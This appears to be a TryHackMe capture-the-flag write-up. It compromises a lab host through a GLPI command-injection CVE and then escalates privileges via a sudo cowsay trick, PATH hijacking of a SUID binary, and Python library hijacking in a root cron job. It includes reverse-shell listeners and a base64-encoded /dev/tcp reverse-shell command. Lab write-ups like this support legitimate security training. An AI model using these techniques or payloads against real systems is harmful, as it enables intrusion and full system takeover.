---
title: Space 1nvaders THM Writeup
author: dos4s
date: 2024-10-22
categories: [linux, pentesting]
tags: [ tryhackme ]
---

# Reconnaisance

## Ports

Enumerating ports there are a web and ssh

```
nmap -n -v 10.10.180.41
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Upon checking the web it redirects to https://space1nvaders.thm/ 

```
echo "10.10.180.41 space1nvaders.thm" | tee -a /etc/hosts
```

After adding the hosts entry and accessing the website it doesn't seem to have anything more than a glitchy gif.

## Directory/file enumeration
 
Lets enumerate with gobuster

 `gobuster dir -u http://space1nvaders.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml,js`

It does not get anything, lets try with dirsearch

```
└─$ dirsearch -u http://space1nvaders.thm                                                              
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                       
 (_||| _) (/_(_|| (_| )                                                                                
                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sir/Desktop/thm/spaceinvaders/reports/http_space1nvaders.thm/_24-10-20_20-20-56.txt

Target: http://space1nvaders.thm/

[20:20:56] Starting:                                                                                   
[20:21:00] 403 -  282B  - /.ht_wsr.txt                                      
[20:21:00] 403 -  282B  - /.htaccess.bak1                                   
[20:21:00] 403 -  282B  - /.htaccess.orig                                   
[20:21:00] 403 -  282B  - /.htaccess.save                                   
[20:21:00] 403 -  282B  - /.htaccess.sample
[20:21:00] 403 -  282B  - /.htaccess_extra
[20:21:00] 403 -  282B  - /.htaccessOLD                                     
[20:21:00] 403 -  282B  - /.htaccess_orig                                   
[20:21:00] 403 -  282B  - /.htaccessBAK
[20:21:00] 403 -  282B  - /.htm                                             
[20:21:00] 403 -  282B  - /.htaccess_sc
[20:21:00] 403 -  282B  - /.html                                            
[20:21:00] 403 -  282B  - /.htaccessOLD2
[20:21:00] 403 -  282B  - /.htpasswd_test                                   
[20:21:00] 403 -  282B  - /.htpasswds
[20:21:00] 403 -  282B  - /.httr-oauth
[20:21:01] 403 -  282B  - /.php                                             
[20:21:14] 301 -  321B  - /glpi  ->  http://space1nvaders.thm/glpi/         
[20:21:17] 200 -    3KB - /glpi/                                            
[20:21:23] 403 -  282B  - /server-status                                    
[20:21:23] 403 -  282B  - /server-status/                                   
                                                                             
Task Completed
```     


Briefly after dirsearch finds glpi and later on gobuster too

# Discovery

After accesing glpi subdirectory, on a simple glance there's no version shown; tho it does show the copyright from 2015 to 2022.

The patched CVE are listed along the releases, so by looking in the glpi project github we can check those around the same time

* https://github.com/glpi-project/glpi/releases?page=2

Flicking through the releases patch notes, there's some critical cve and one of those is for command injection; **CVE-2022-35914**

[SECURITY] **[critical]** Command injection using a third-party library script (CVE-2022-35914)
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35914
	* Description: /vendor/htmlawed/htmlawed/htmLawedTest.php in the htmlawed module for GLPI through 10.0.2 allows PHP code injection.

By looking into the details, the rce is on a third party library, htmlawed.

* http://space1nvaders.thm/glpi/vendor/htmlawed/htmlawed/htmLawedTest.php

After reading a POC of CVE-2022-35914, by calling exec php function inside the hook parameter it can execute whatever is set on input

It'd be funnier if exec was disabled...



# Foothold as www-data

Now by putting a reverse shell in input parameter and trigger exec function, a reverse shell comes our way


```
└─$ nc -nvlp 777
listening on [any] 777 ...
connect to [10.23.30.45] from (UNKNOWN) [10.10.180.41] 58850
bash: cannot set terminal process group (546): Inappropriate ioctl for device
bash: no job control in this shell
 ______________________________
< Reply hazy, ask again later. >
 ------------------------------
        \   ^__^
         \  (xx)\_______
            (__)\       )\/\
             U  ||----w |
                ||     ||
www-data@space1nvaders:/var/www/glpi/vendor/htmlawed/htmlawed$
``` 

###  Enumeration

First flag found on www-data's home

After some enumeration, /etc/glpi/config_db.php is found. 

```
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = '<REDACTED>';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

### Prove your sql skills

Those credential doesn't work, despite it should; as those are the credentials stored in glpi db config file. 

There's '%3A' in the password, which could be ':' url encoded due to the glpi web install wizard.

Once inside the db let's enumerate the users

`MariaDB [glpi]> select name,password from glpi_users;`
`+-------------+--------------------------------------------------------------+`
`| name        | password                                                     |`
`+-------------+--------------------------------------------------------------+`
`| glpi        | 92253d0aeae0bf04dd5393bc24eded89                             |`
`| post-only   | $2y$10$LTMMupJ4aWeQ5o6ogZ.Ho.xXv8IqWY6kFpjfbkB/ai2rqFkEQT1fa |`
`| tech        | $2y$10$53WXg8nVJ4jyk9FISMnyVOmUZSSYOsZk5MfJ.ZmP4C4aLIDmICXqa |`
`| normal      | $2y$10$mgqaods8toKZOj2XT15JDe9JlhLAsP1EAG1V7Xt23plBUg1Oj.GZS |`
`| glpi-system |                                                              |`
`| jen         | 3ae0d7e4a27c5b479f4b0a93a1a9278e                             |`
`| roy         | 354be8a5a9f70c73f50aba3608b5f92d                             |`
`| maurice     | 190d8af135008847462f6d7b59ad3a24                             |`
`+-------------+--------------------------------------------------------------+`
`8 rows in set (0.001 sec)`

At the beggining of the room its told to not brute force. Then lets reset someone password

https://www.bytebang.at/Blog/Reset+GLPI+passwords+in+the+database

`MariaDB [glpi]> update glpi_users set password=MD5('qwer') where name='glpi';`
`Query OK, 1 row affected (0.008 sec)`
`Rows matched: 1  Changed: 1  Warnings: 0`

### Login to glpi

There is nothing but a few tickets and in one of those, there's some credentials apart from various users involved: Jen, Maurice and Roy

# Login with Jen credentials

```
└─$ ssh jen@space1nvaders.thm                                                                          
jen@space1nvaders.thm's password:
Linux space1nvaders 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
 _______________________________________
/ Talkers are no good doers. -- William \
\ Shakespeare, "Henry VI"               /
 ---------------------------------------
        \   ^__^
         \  (xx)\_______
            (__)\       )\/\
             U  ||----w |
                ||     ||
				jen@space1nvaders:~$
```
### Enumeration

Once with Jen, lets check if she has sudo permissions

`jen@space1nvaders:~$ sudo -l`
`[sudo] contraseña para jen:` 
`Matching Defaults entries for jen on space1nvaders:`
    `env_reset, mail_badpass,`
    `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty`

`User jen may run the following commands on space1nvaders:`
    `(maurice) /usr/games/cowsay`

Jen has sudo privileges to execute cowsay, lets find out if it this binary has some way to scalate privileges

https://gtfobins.github.io/gtfobins/cowsay/

2nd flag found at /home/jen/jen.txt

### Privilege Escalation to Maurice

```
jen@space1nvaders:~$ echo 'exec "/bin/sh";' > /tmp/bingo
jen@space1nvaders:~$ sudo -u maurice /usr/games/cowsay -f /tmp/bingo x
$ whoami
maurice
$
``` 

## Maurice

3rd flag found at /home/maurice/maurice.txt

User maurice belongs to group techsupport which is not default group so it must have something to do

```
maurice@space1nvaders:~$ find / -group techsupport 2>/dev/null
/opt/retro
/opt/retro/invaders

maurice@space1nvaders:~$ ls -l /opt/retro/
total 16
-rwsr-x--- 1 root techsupport 16104 oct 18 19:34 invaders
```


There's a binary with suid which runs a train and a space invaders game, let's check it out with strings

Between all the garbage, there's this string:
```
/usr/games/sl -a && ninvaders
```

sl is the binary for the train and ninvaders is the game, but the latter is not called from an absolute path so if an executable with the same name,whether rogue or not, is found on any path from PATH variable before where the legitimate binary is, it could lead to the execution of the former

### PATH hijacking

Then in this case i'll create the file ninvaders on /tmp and add it to PATH

```
echo -e '#!/bin/bash\n/bin/bash'> /tmp/ninvaders
chmod +x /tmp/ninvaders
```

Now lets run the suid binary

```
maurice@space1nvaders:/opt/retro$ ./invaders 
 __________________________________
/ You will overcome the attacks of \
\ jealous associates.              /
 ----------------------------------
        \   ^__^
         \  (xx)\_______
            (__)\       )\/\
             U  ||----w |
                ||     ||
bash: /home/maurice/.bashrc: Permiso denegado
roy@space1nvaders:/opt/retro$
``` 


# Roy

After setting up the rogue ninvaders and executing the suid binary, we get a shell as roy.

## Enumeration 

Inside roy's home, there's an ssh key and a picture;
lets try to ssh with the ssh_key. It request for a passphrase...

## Stego

Lets check the picture metadata:...

nothing interesting, but checking out with steghide shows some files embedded

`└─$ steghide info forgottenpassword-meme.jpeg` 
`"forgottenpassword-meme.jpeg":`
  `format: jpeg`
  `capacity: 455.0 Byte`
`Try to get information about embedded data ? (y/n) y`
`Enter passphrase:` 
  `embedded file "gg":`
    `size: 286.0 Byte`
    `encrypted: rijndael-128, cbc`
    `compressed: yes`


After extracting the file and checking the contents, it seems to be braille, lets check it out in cyberchef

After braille, there were only A-F and 0-9 so high chances of hex string, then it ends on == so base64 on the fly

Then let's try use that rsa with that password

## Login as Roy with ssh keys

Once with a proper shell as roy, there's no way to check sudo as we don't have the password, but with some enumeration you'll find out there's a weird cronjob task running as root

```
*/1 *   * * *   root    /usr/bin/python3 /opt/.sherlock/run.py
```

After taking a glance at the code, It seems to be logging the failed ssh attempts to /var/log/sshFailed.log, no user input. Although it does import some libraries; logging, subprocess, colorama

Roy has write permission to the folder /opt/.sherlock/, so by creating a file inside with the same name of the library when root runs the script, it will import the rogue library

## Python Library Hijacking

Create the rogue library in the same path as in the script
- logging.py
```
import os
os.system("whoami > /tmp/test.txt")
```

Test it by executing it with roy

```
roy@space1nvaders:/opt/.sherlock$ python3 run.py 
Traceback (most recent call last):
  File "/opt/.sherlock/run.py", line 1, in <module>
    from logging import getLogger, basicConfig, INFO
ImportError: cannot import name 'getLogger' from 'logging' (/opt/.sherlock/logging.py)
```

Albeit there are some errors because its not finding the functions to import from the library, lets find out if it works

```
roy@space1nvaders:/opt/.sherlock$ cat /tmp/test.txt 
roy
```


## Getting root

Then after a brief, when the cron task its triggered, the content of test.txt should change to root

```
roy@space1nvaders:/opt/.sherlock$ cat /tmp/test.txt 
root
```

Great it works, then set up your  compatible reverse shell of choice inside the rogue library and get root

```
import os
os.system("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE5Ljg0Lzc3NyAwPiYx|base64 -d |bash'")
```

Save and wait for the shell

```
└─$ nc -nvlp 777
listening on [any] 777 ...
connect to [172.19.0.10] from (UNKNOWN) [172.19.0.123] 50436
bash: no se puede establecer el grupo de proceso de terminal (2522): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
 _____________________________________
/ You will be the victim of a bizarre \
\ joke.                               /
 -------------------------------------
        \   ^__^
         \  (xx)\_______
            (__)\       )\/\
             U  ||----w |
                ||     ||
root@space1nvaders:~# 
root@space1nvaders:~# id
id
uid=0(root) gid=0(root) grupos=0(root)
```

Found root flag at /root/root.txt







